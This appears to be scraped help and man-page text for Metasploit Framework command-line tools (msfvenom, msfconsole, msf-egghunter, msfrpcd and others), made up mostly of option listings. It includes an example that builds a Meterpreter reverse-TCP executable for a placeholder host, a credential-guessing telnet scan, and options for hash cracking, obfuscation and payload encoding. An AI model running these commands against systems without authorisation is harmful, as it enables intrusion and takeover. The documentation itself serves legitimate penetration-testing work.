name: metasploit-framework
title: metasploit-framework

commands.name: msf-egghunter

arguments.description: See --list-formats for a list of supported output formats
arguments.raw: -f, --format <String>            See --list-formats for a list of supported output formats

arguments.description: (Optional) Bad characters to avoid for the egg
arguments.raw: -b, --badchars <String>          (Optional) Bad characters to avoid for the egg

arguments.description: (Optional) Specify a custom variable name to use for certain output formats
arguments.raw: -v, --var-name <name>            (Optional) Specify a custom variable name to use for certain output formats

commands.raw_help:
root@kali:~# msf-egghunter -h
 Usage: msf-egghunter [options]
 Example: msf-egghunter -f python -e W00T
 
 Specific options:
   -f, --format <String>            See --list-formats for a list of supported output formats
   -b, --badchars <String>          (Optional) Bad characters to avoid for the egg
   -e, --egg <String>               The egg (Please give 4 bytes)
   -p, --platform <String>          (Optional) Platform
       --startreg <String>          (Optional) The starting register
       --forward                    (Optional) To search forward
       --depreg <String>            (Optional) The DEP register
       --depdest <String>           (Optional) The DEP destination
       --depsize <Integer>          (Optional) The DEP size
       --depmethod <String>         (Optional) The DEP method to use (virtualprotect/virtualalloc/copy/copy_size)
   -a, --arch <String>              (Optional) Architecture
       --list-formats               List all supported output formats
   -v, --var-name <name>            (Optional) Specify a custom variable name to use for certain output formats
   -h, --help                       Show this message

local_help.-h:
Usage: msf-egghunter [options]
Example: msf-egghunter -f python -e W00T

Specific options:
    -f, --format <String>            See --list-formats for a list of supported output formats
    -b, --badchars <String>          (Optional) Bad characters to avoid for the egg
    -e, --egg <String>               The egg (Please give 4 bytes)
    -p, --platform <String>          (Optional) Platform
        --startreg <String>          (Optional) The starting register
        --forward                    (Optional) To search forward
        --depreg <String>            (Optional) The DEP register
        --depdest <String>           (Optional) The DEP destination
        --depsize <Integer>          (Optional) The DEP size
        --depmethod <String>         (Optional) The DEP method to use (virtualprotect/virtualalloc/copy/copy_size)
    -a, --arch <String>              (Optional) Architecture
        --list-formats               List all supported output formats
    -v, --var-name <name>            (Optional) Specify a custom variable name to use for certain output formats
    -h, --help                       Show this message
local_help.help: [x] missing argument: No options set, try -h for usage

commands.name: msf-find_badchars

arguments.description: The list of characters to avoid: '\x00\xff'
arguments.raw: -b   The list of characters to avoid: '\x00\xff'

arguments.description: Read memory contents from the supplied file path
arguments.raw: -i   Read memory contents from the supplied file path

arguments.description: The format that the memory contents are in (empty to list)
arguments.raw: -t   The format that the memory contents are in (empty to list)

commands.raw_help:
root@kali:~# msf-find_badchars -h
 
   Usage: msf-find_badchars <options>
 
 OPTIONS:
 
   -b   The list of characters to avoid: '\x00\xff'
   -h   Help banner
   -i   Read memory contents from the supplied file path
   -t   The format that the memory contents are in (empty to list)

local_help.--help:
[*] Please paste the memory contents in "raw" format below (end with EOF):
[*] All characters matched, no new bad characters discovered.
local_help.-h:
Usage: msf-find_badchars <options>

OPTIONS:

    -b   The list of characters to avoid: '\x00\xff'
    -h   Help banner
    -i   Read memory contents from the supplied file path
    -t   The format that the memory contents are in (empty to list)
local_help.help:
[*] Please paste the memory contents in "raw" format below (end with EOF):
[*] All characters matched, no new bad characters discovered.

commands.name: msf-halflm_second

arguments.description: The encrypted LM hash to crack
arguments.raw: -n   The encrypted LM hash to crack

arguments.description: The decrypted LANMAN password for bytes 1-7
arguments.raw: -p   The decrypted LANMAN password for bytes 1-7

commands.raw_help:
root@kali:~# msf-halflm_second -h
 
   Usage: msf-halflm_second <options>
 
 OPTIONS:
 
   -h   Display this help information
   -n   The encrypted LM hash to crack
   -p   The decrypted LANMAN password for bytes 1-7
   -s   The server challenge (default value 1122334455667788)

commands.name: msf-jsobfu

arguments.description: Number of times to obfuscate the JavaScript
arguments.raw: -t, --iteration <Integer>        Number of times to obfuscate the JavaScript

arguments.description: The JavaScript file you want to obfuscate (default=1)
arguments.raw: -i, --input <String>             The JavaScript file you want to obfuscate (default=1)

commands.raw_help:
root@kali:~# msf-jsobfu -h
 Usage: msf-jsobfu [options]
 
 Specific options:
   -t, --iteration <Integer>        Number of times to obfuscate the JavaScript
   -i, --input <String>             The JavaScript file you want to obfuscate (default=1)
   -o, --output <String>            Save the obfuscated file as
   -p id1,id2,                      The identifiers to preserve
       --preserved-identifiers
   -h, --help                       Show this message

local_help.--help:
Usage: msf-jsobfu [options]

Specific options:
    -t, --iteration <Integer>        Number of times to obfuscate the JavaScript
    -i, --input <String>             The JavaScript file you want to obfuscate (default=1)
    -o, --output <String>            Save the obfuscated file as
    -p id1,id2,                      The identifiers to preserve
        --preserved-identifiers
    -h, --help                       Show this message
local_help.-h:
Usage: msf-jsobfu [options]

Specific options:

    -i, --input <String>             The JavaScript file you want to obfuscate (default=1)
    -o, --output <String>            Save the obfuscated file as

        --preserved-identifiers
    -h, --help                       Show this message

commands.name: msf-md5_lookup

arguments.description: The file that contains all the MD5 hashes (one line per hash)
arguments.raw: -i, --input <file>               The file that contains all the MD5 hashes (one line per hash)

arguments.description: (Optional) Select databases: all, authsecu, i337, md5_my_addr, md5_net, md5crack, md5cracker, md5decryption, md5online, md5pass, netmd5crack, tmto (Default=all)
arguments.raw: -d, --databases <names>          (Optional) Select databases: all, authsecu, i337, md5_my_addr, md5_net, md5crack, md5cracker, md5decryption, md5online, md5pass, netmd5crack, tmto (Default=all)

arguments.description: (Optional) Save the results to a file (Default=md5_results.txt)
arguments.raw: -o, --out <filepath>             (Optional) Save the results to a file (Default=md5_results.txt)

commands.raw_help:
root@kali:~# msf-md5_lookup -h
 Usage: msf-md5_lookup [options]
 
 Specific options:
   -i, --input <file>               The file that contains all the MD5 hashes (one line per hash)
   -d, --databases <names>          (Optional) Select databases: all, authsecu, i337, md5_my_addr, md5_net, md5crack, md5cracker, md5decryption, md5online, md5pass, netmd5crack, tmto (Default=all)
   -o, --out <filepath>             (Optional) Save the results to a file (Default=md5_results.txt)
   -h, --help                       Show this message

commands.name: msf-msf_irb_shell

arguments.description: Set external and internal encodings to UTF-8.
arguments.raw: -U                Set external and internal encodings to UTF-8.

arguments.description: in]        Set default external (ex) and internal (in) encodings
arguments.raw: -E ex[:in]        Set default external (ex) and internal (in) encodings

arguments.description: Set n[0-5] to method to create Binding Object,
arguments.raw: --context-mode n  Set n[0-5] to method to create Binding Object,

arguments.description: Add an extra doc dir for the doc dialog.
arguments.raw: --extra-doc-dir   Add an extra doc dir for the doc dialog.

arguments.description: Don't use single line editor module (default).
arguments.raw: --nosingleline    Don't use single line editor module (default).

arguments.description: Use prompt appropriate for inf-ruby-mode on emacs.
arguments.raw: --inf-ruby-mode   Use prompt appropriate for inf-ruby-mode on emacs.

arguments.description: Script mode (default, treat first argument as script)
arguments.raw: --script          Script mode (default, treat first argument as script)

arguments.description: No script mode (leave arguments in argv)
arguments.raw: --noscript        No script mode (leave arguments in argv)

arguments.description: Show stack trace for each command.
arguments.raw: --tracer          Show stack trace for each command.

commands.raw_help:
root@kali:~# msf-msf_irb_shell -h
 Usage:  irb.rb [options] [programfile] [arguments]
 -f                Don't initialize from configuration file.
 -d                Set $DEBUG and $VERBOSE to true (same as 'ruby -d').
 -r load-module    Require load-module (same as 'ruby -r').
 -I path           Specify $LOAD_PATH directory (same as 'ruby -I').
 -U                Set external and internal encodings to UTF-8.
 -E ex[:in]        Set default external (ex) and internal (in) encodings
                   (same as 'ruby -E').
 -w                Enable warnings (same as 'ruby -w' or 'ruby -W1').
 -W[level=2]       Set warning level: 0=silence, 1=medium, 2=verbose
                   (same as 'ruby -W').
 --context-mode n  Set n[0-5] to method to create Binding Object,
                   when new workspace was created.
 --extra-doc-dir   Add an extra doc dir for the doc dialog.
 --echo            Show result (default).
 --noecho          Don't show result.
 --echo-on-assignment
                   Show result on assignment.
 --noecho-on-assignment
                   Don't show result on assignment.
 --truncate-echo-on-assignment
                   Show truncated result on assignment (default).
 --inspect         Use 'inspect' for output.
 --noinspect       Don't use 'inspect' for output.
 --no-pager        Don't use pager.
 --multiline       Use multiline editor module (default).
 --nomultiline     Don't use multiline editor module.
 --singleline      Use single line editor module.
 --nosingleline    Don't use single line editor module (default).
 --colorize        Use color-highlighting (default).
 --nocolorize      Don't use color-highlighting.
 --autocomplete    Use auto-completion (default).
 --noautocomplete  Don't use auto-completion.
 --regexp-completor
                   Use regexp based completion (default).
 --type-completor  Use type based completion.
 --prompt prompt-mode, --prompt-mode prompt-mode
                   Set prompt mode. Pre-defined prompt modes are:
                   'default', 'classic', 'simple', 'inf-ruby', 'xmp', 'null'.
 --inf-ruby-mode   Use prompt appropriate for inf-ruby-mode on emacs.
                   Suppresses --multiline and --singleline.
 --sample-book-mode, --simple-prompt
                   Set prompt mode to 'simple'.
 --noprompt        Don't output prompt.
 --script          Script mode (default, treat first argument as script)
 --noscript        No script mode (leave arguments in argv)
 --single-irb      Share self with sub-irb.
 --tracer          Show stack trace for each command.
 --back-trace-limit n[=16]
                   Display backtrace top n and bottom n.
 --verbose         Show details.
 --noverbose       Don't show details.
 -v, --version     Print the version of irb.
 -h, --help        Print help.
 --                Separate options of irb from the list of command-line args.

commands.name: msf-nasm_shell
commands.raw_help:
root@kali:~# msf-nasm_shell -h
 0 bits not supported

commands.name: msf-virustotal

arguments.description: (Optional) Number of seconds to wait for the report
arguments.raw: -d <seconds>                     (Optional) Number of seconds to wait for the report

arguments.description: (Optional) Do a hash search without uploading the sample
arguments.raw: -q                               (Optional) Do a hash search without uploading the sample

commands.raw_help:
root@kali:~# msf-virustotal -h
 Usage: msf-virustotal [options]
 
 Specific options:
   -k <key>                         (Optional) Virusl API key to use
   -d <seconds>                     (Optional) Number of seconds to wait for the report
   -q                               (Optional) Do a hash search without uploading the sample
   -f <filenames>                   Files to scan
 
 Common options:
   -h, --help                       Show this message

commands.name: msfconsole

arguments.description: Set Rails environment, defaults to RAIL_ENV environment variable or 'production'
arguments.default: s to RAIL_ENV environment variable or 'production'
arguments.raw: -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

arguments.description: Specify a directory containing additional DB migrations
arguments.raw: -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations

arguments.description: Specify a YAML file containing database settings
arguments.raw: -y, --yaml PATH                  Specify a YAML file containing database settings
-c FILE                          Load the specified configuration file
-m, --module-path DIRECTORY      Load an additional module path

arguments.description: Ask before exiting Metasploit or accept 'exit -y'
arguments.raw: -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'

arguments.description: Save command history to the specified file
arguments.raw: -H, --history-file FILE          Save command history to the specified file

arguments.description: Specify a logger to use (Flatfile, Stderr, Stdout, StdoutWithoutTimestamps, TimestampColorlessFlatfile)
arguments.raw: -l, --logger STRING              Specify a logger to use (Flatfile, Stderr, Stdout, StdoutWithoutTimestamps, TimestampColorlessFlatfile)

arguments.description: Use the system Readline library instead of RbReadline
arguments.raw: -L, --real-readline              Use the system Readline library instead of RbReadline
-o, --output FILE                Output to the specified file
-p, --plugin PLUGIN              Load a plugin on startup

arguments.description: Do not print the banner on startup
arguments.raw: -q, --quiet                      Do not print the banner on startup

arguments.description: Execute the specified resource file (- for stdin)
arguments.raw: -r, --resource FILE              Execute the specified resource file (- for stdin)

arguments.description: Execute the specified console commands (use ; for multiples)
arguments.raw: -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)

arguments.description: --yaml PATH                  Specify a YAML file containing data-
arguments.raw: -y,  --yaml PATH                  Specify a YAML file containing data-

arguments.description: --ask                        Ask before exiting Metasploit or ac-
arguments.raw: -a,  --ask                        Ask before exiting Metasploit or ac-

arguments.description: --resource  FILE              Execute the specified resource file
arguments.raw: -r,  --resource  FILE              Execute the specified resource file

commands.raw_help:
root@kali:~# msfconsole -h
 Usage: msfconsole [options]
 
 Common options:
   -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'
 
 Database options:
   -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
   -n, --no-database                Disable database support
   -y, --yaml PATH                  Specify a YAML file containing database settings
 
 Framework options:
   -c FILE                          Load the specified configuration file
   -v, -V, --version                Show version
 
 Module options:
       --[no-]defer-module-loads    Defer module loading unless explicitly asked
   -m, --module-path DIRECTORY      Load an additional module path
 
 Console options:
   -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
   -H, --history-file FILE          Save command history to the specified file
   -l, --logger STRING              Specify a logger to use (Flatfile, Stderr, Stdout, StdoutWithoutTimestamps, TimestampColorlessFlatfile)
       --[no-]readline
   -L, --real-readline              Use the system Readline library instead of RbReadline
   -o, --output FILE                Output to the specified file
   -p, --plugin PLUGIN              Load a plugin on startup
   -q, --quiet                      Do not print the banner on startup
   -r, --resource FILE              Execute the specified resource file (- for stdin)
   -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
   -h, --help                       Show this message

local_help.--help:
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --[no-]defer-module-loads    Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -l, --logger STRING              Specify a logger to use (Stdout, StdoutWithoutTimestamps, TimestampColorlessFlatfile, Flatfile, Stderr)
        --[no-]readline
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
local_help.-h:
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --[no-]defer-module-loads    Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -l, --logger STRING              Specify a logger to use (Stdout, StdoutWithoutTimestamps, TimestampColorlessFlatfile, Flatfile, Stderr)
        --[no-]readline
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
local_help.help:
[*] Starting the Metasploit Framework console.../
[*] Starting the Metasploit Framework console...-
[*] Starting the Metasploit Framework console...\
[*] starting the Metasploit Framework console...|
local_help.man:
MSFCONSOLE(1)             Metasploit Framework Console            MSFCONSOLE(1)

NAME
     msfconsole - Metasploit Framework Console

SYNOPSIS
     msfconsole [options]

DESCRIPTION
     Msfconsole  is probably the most popular interface to the MSF. It provides
     an "all-in-one" centralized console and allows  you  efficient  access  to
     virtually  all  of the options available in the Metasploit Framework. Msf-
     console may seem intimidating at first, but once you learn the  syntax  of
     the  commands you will learn to appreciate the power of utilizing this in-
     terface.

OPTIONS
Common options
     -E, --environment ENVIRONMENT
     The Rails environment. Will use RAIL_ENV environment variable if  that  is
     set.   Defaults  to production if neither option not RAILS_ENV environment
     variable is set.

Database options
         -M, --migration-path DIRECTORY   Specify a directory containing  addi-
     tional DB migrations
         -n, --no-database                Disable database support
         -y,  --yaml PATH                  Specify a YAML file containing data-
     base settings

Framework options
         -c FILE                          Load the specified configuration file
         -v, --version                    Show version

Module options
             --defer-module-loads         Defer module loading  unless  explic-
     itly asked.
         -m, --module-path DIRECTORY      An additional module path

Console options:
         -a,  --ask                        Ask before exiting Metasploit or ac-
     cept 'exit -y'
         -d, --defanged                   Execute the console as defanged
         -L, --real-readline              Use the system Readline  library  in-
     stead of RbReadline
         -o, --output FILE                Output to the specified file
         -p, --plugin PLUGIN              Load a plugin on startup
         -q, --quiet                      Do not print the banner on start up
         -r,  --resource  FILE              Execute the specified resource file
     (- for stdin)
         -x, --execute-command COMMAND    Execute the specified string as  con-
     sole commands (use ; for multiples)
         -h, --help                       Show help message

EXAMPLE
     msfconsole  -q -x "use auxiliary/scanner/telnet/telnet_login; set USERNAME
     msfadmin; set PASSWORD msfadmin; set RHOSTS metasploitable; run; exit -y"

SEE ALSO
     msfcli(1) - deprecated -
     msfvenom(1)
     msfpayload(1) - deprecated -
     msfencode(1) - deprecated -

AUTHOR(S)
     Creator
            HD Moore - @hdmoore / hdm@metasploit.com
            Man Page  Author:  Kali  Linuxtm  File  man  page  bug  reports  at
            https://bugs.kali.org

     Top Contributors,
            Joshua J. Drake, Wei Chen, James Lee, Mario Ceballos, Steve Tornio,
            David  D.  Rude  II,  Ramon  Valle,  Nathan Keltner, Tod Beardsley,
            Patrick Webster, Chris Gates, Jonathan Cran, Efrain Torres,  Carlos
            Perez,  Stephen  Fewer, Alexandre Maloteaux, Chao Mu, Juan Vazquez,
            Brandon Perry, David Maloney

NOTES
     For a more complete list of contributors run:
     /usr/share/metasploit-framework/tools/modules_authors.rb
     Or visit:
     https://github.com/rapid7/metasploit-framework/graphs/contributors

COPYRIGHT

     *      Redistributions  in  binary form must reproduce the above copyright
            notice, this list of conditions and the following disclaimer in the
            documentation and/or other materials provided  with  the  distribu-
            tion.

     *      Neither  the  name  of Rapid7 LLC nor the names of its contributors
            may be used to endorse or promote products derived from this  soft-
            ware without specific prior written permission.

            THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
            "AS  IS"  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
            LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY  AND  FITNESS

            COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
            INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL  DAMAGES  (INCLUD-
            ING,  BUT  NOT  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SER-
            VICES; LOSS OF USE, DATA, OR  PROFITS;  OR  BUSINESS  INTERRUPTION)
            HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,

commands.name: msfd

arguments.description: Bind to this IP address instead of loopback
arguments.raw: -a   Bind to this IP address instead of loopback

arguments.description: Specify list of hosts allowed to connect
arguments.raw: -A   Specify list of hosts allowed to connect

arguments.description: Specify list of hosts not allowed to connect
arguments.raw: -D   Specify list of hosts not allowed to connect

arguments.description: Run the daemon in the foreground
arguments.raw: -f   Run the daemon in the foreground

arguments.description: Bind to this port instead of 55554
arguments.raw: -p   Bind to this port instead of 55554

arguments.description: Do not print the banner on startup
arguments.raw: -q   Do not print the banner on startup

commands.raw_help:
root@kali:~# msfd -h
 
 Usage: msfd <options>
 
 OPTIONS:
 
   -a   Bind to this IP address instead of loopback
   -A   Specify list of hosts allowed to connect
   -D   Specify list of hosts not allowed to connect
   -f   Run the daemon in the foreground
   -h   Help banner
   -p   Bind to this port instead of 55554
   -q   Do not print the banner on startup
   -s   Use SSL

local_help.-h:
Usage: msfd <options>

OPTIONS:

    -a   Bind to this IP address instead of loopback
    -A   Specify list of hosts allowed to connect
    -D   Specify list of hosts not allowed to connect
    -f   Run the daemon in the foreground
    -h   Help banner
    -p   Bind to this port instead of 55554
    -q   Do not print the banner on startup
    -s   Use SSL

commands.name: msfdb
commands.raw_help:
root@kali:~# msfdb -h
 
 Manage the metasploit framework database
 
 You can use an specific port number for the
 PostgreSQL connection setting the PGPORT variable
 in the current shell.
 
 Example: PGPORT=5433 msfdb init
 
 msfdb init     # start and initialize the database
 msfdb reinit   # delete and reinitialize the database
 msfdb delete   # delete database and stop using it
 msfdb start    # start the database
 msfdb stop     # stop the database
 msfdb status   # check service status
 msfdb run      # start the database and run msfconsole

examples.command: msfdb init     # start and initialize the database
msfdb reinit   # delete and reinitialize the database
msfdb delete   # delete database and stop using it
msfdb run      # start the database and run msfconsole

local_help.--help:
Manage the metasploit framework database

You can use an specific port number for the
PostgreSQL connection setting the PGPORT variable
in the current shell.

Example: PGPORT=5433 msfdb init

  msfdb init     # start and initialize the database
  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status
  msfdb run      # start the database and run msfconsole
local_help.-h:

  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status
  msfdb run      # start the database and run msfconsole

commands.name: msfrpcd

arguments.description: Run the daemon in the foreground
arguments.raw: -f   Run the daemon in the foreground

arguments.description: Specify the password to access msfrpcd
arguments.raw: -P   Specify the password to access msfrpcd

arguments.description: Disable SSL on the RPC socket
arguments.raw: -S   Disable SSL on the RPC socket

arguments.description: Specify the username to access msfrpcd
arguments.raw: -U   Specify the username to access msfrpcd

arguments.description: (JSON-RPC) SSL enable verify (optional) client cert requests
arguments.raw: -v   (JSON-RPC) SSL enable verify (optional) client cert requests

commands.raw_help:
root@kali:~# msfrpcd -h
 
 Usage: msfrpcd <options>
 
 OPTIONS:
 
   -a   Bind to this IP address (default: 0.0.0.0)
   -c   (JSON-RPC) Path to certificate (default: /root/.msf4/msf-ws-cert.pem)
   -f   Run the daemon in the foreground
   -h   Help banner
   -j   (JSON-RPC) Start JSON-RPC server
   -k   (JSON-RPC) Path to private key (default: /root/.msf4/msf-ws-key.pem)
   -n   Disable database
   -p   Bind to this port (default: 55553)
   -P   Specify the password to access msfrpcd
   -S   Disable SSL on the RPC socket
   -t   Token Timeout seconds (default: 300)
   -U   Specify the username to access msfrpcd
   -u   URI for Web server
   -v   (JSON-RPC) SSL enable verify (optional) client cert requests

local_help.--help: [-] Error: a password must be specified (-P)
local_help.-h:
Usage: msfrpcd <options>

OPTIONS:

    -a   Bind to this IP address (default: 0.0.0.0)
    -c   (JSON-RPC) Path to certificate (default: /root/.msf4/msf-ws-cert.pem)
    -f   Run the daemon in the foreground
    -h   Help banner
    -j   (JSON-RPC) Start JSON-RPC server
    -k   (JSON-RPC) Path to private key (default: /root/.msf4/msf-ws-key.pem)
    -n   Disable database
    -p   Bind to this port (default: 55553)
    -P   Specify the password to access msfrpcd
    -S   Disable SSL on the RPC socket
    -t   Token Timeout seconds (default: 300)
    -U   Specify the username to access msfrpcd
    -u   URI for Web server
    -v   (JSON-RPC) SSL enable verify (optional) client cert requests
local_help.help: [-] Error: a password must be specified (-P)

 msfupdate is no longer supported when Metasploit is part of the operating
 system. Please use 'apt update; apt install metasploit-framework'

commands.name: msfvenom

arguments.description: <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
arguments.raw: -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all

arguments.description: <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
arguments.raw: -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom

arguments.description: List --payload <value>'s standard, advanced and evasion options
arguments.raw: --list-options               List --payload <value>'s standard, advanced and evasion options

arguments.description: <encoder>  The encoder to use (use --list encoders to list)
arguments.raw: -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)

arguments.description: <value>    The service name to use when generating a service binary
arguments.raw: --service-name    <value>    The service name to use when generating a service binary

arguments.description: <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
arguments.raw: --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string

arguments.description: Generate the smallest possible payload using all available encoders
arguments.raw: --smallest                   Generate the smallest possible payload using all available encoders

arguments.description: <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
arguments.raw: --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)

arguments.description: <value>    A key to be used for --encrypt
arguments.raw: --encrypt-key     <value>    A key to be used for --encrypt

arguments.description: <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
arguments.raw: -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)

arguments.description: <platform> The platform for --payload (use --list platforms to list)
arguments.raw: --platform        <platform> The platform for --payload (use --list platforms to list)

arguments.description: <path>     Save the payload to a file
arguments.raw: -o, --out             <path>     Save the payload to a file

arguments.description: <length>   Prepend a nopsled of [length] size on to the payload
arguments.raw: -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload

arguments.description: Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
arguments.raw: --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)

arguments.description: <length>   The maximum size of the resulting payload
arguments.raw: -s, --space           <length>   The maximum size of the resulting payload

arguments.description: <length>   The maximum size of the encoded payload (defaults to the -s value)
arguments.raw: --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)

arguments.description: <count>    The number of times to encode the payload
arguments.raw: -i, --iterations      <count>    The number of times to encode the payload

arguments.description: <path>     Specify an additional win32 shellcode file to include
arguments.raw: -c, --add-code        <path>     Specify an additional win32 shellcode file to include

arguments.description: <path>     Specify a custom executable file to use as a template
arguments.raw: -x, --template        <path>     Specify a custom executable file to use as a template

arguments.description: Preserve the --template behaviour and inject the payload as a new thread
arguments.raw: -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread

arguments.description: <value>    Specify a custom variable name to use for certain output formats
arguments.raw: -v, --var-name        <value>    Specify a custom variable name to use for certain output formats

arguments.description: <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
arguments.raw: -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)

arguments.description: Rebuild the module metadata cache from disk before listing
arguments.raw: --refresh-cache              Rebuild the module metadata cache from disk before listing

arguments.description: --payload  [payload]  Payload  to  use. Specify a '-' or stdin to use
arguments.raw: -p,  --payload  [payload]  Payload  to  use. Specify a '-' or stdin to use

commands.raw_help:
root@kali:~# msfvenom -h
 MsfVenom - a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /usr/bin/msfvenom [options] <var=val>
 Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
 
 Options:
   -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
   -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
       --list-options               List --payload <value>'s standard, advanced and evasion options
   -f, --format          <format>   Output format (use --list formats to list)
   -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
       --service-name    <value>    The service name to use when generating a service binary
       --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
       --smallest                   Generate the smallest possible payload using all available encoders
       --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
       --encrypt-key     <value>    A key to be used for --encrypt
       --encrypt-iv      <value>    An initialization vector for --encrypt
   -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
       --platform        <platform> The platform for --payload (use --list platforms to list)
   -o, --out             <path>     Save the payload to a file
   -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
   -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
       --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
   -s, --space           <length>   The maximum size of the resulting payload
       --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
   -i, --iterations      <count>    The number of times to encode the payload
   -c, --add-code        <path>     Specify an additional win32 shellcode file to include
   -x, --template        <path>     Specify a custom executable file to use as a template
   -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
   -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
   -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
       --refresh-cache              Rebuild the module metadata cache from disk before listing
   -h, --help                       Show this message

local_help.--help:
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
